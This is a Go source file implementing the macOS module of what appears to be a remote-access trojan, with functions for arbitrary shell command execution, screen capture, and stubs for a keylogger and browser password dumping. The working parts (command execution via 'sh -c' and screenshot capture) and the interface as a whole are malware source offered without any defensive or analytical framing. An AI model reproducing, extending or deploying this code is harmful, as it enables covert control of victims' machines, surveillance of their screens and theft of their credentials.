//go:build darwin

package darwin

import (
	"bytes"
	"fmt"
	"image/png"
	"os/exec"

	"github.com/kbinani/screenshot"
)

// DarwinPlatform represents the macOS platform.
type DarwinPlatform struct{}

// NewPlatform returns a new instance of the DarwinPlatform.
func NewPlatform() *DarwinPlatform {
	return &DarwinPlatform{}
}

// ExecuteCommand executes a command on macOS.
func (p *DarwinPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on macOS.
func (p *DarwinPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on macOS.
func (p *DarwinPlatform) StartKeylogger() {}

// GetKeylogs does nothing on macOS.
func (p *DarwinPlatform) GetKeylogs() string {
	return "Keylogger not implemented for macOS."
}

// DumpBrowsers does nothing on macOS.
func (p *DarwinPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for macOS."
}

// Screenshot captures the screen.
func (p *DarwinPlatform) Screenshot() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, fmt.Errorf("error capturing screen: %v", err)
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("error encoding screenshot: %v", err)
	}

	return buf.Bytes(), nil
}
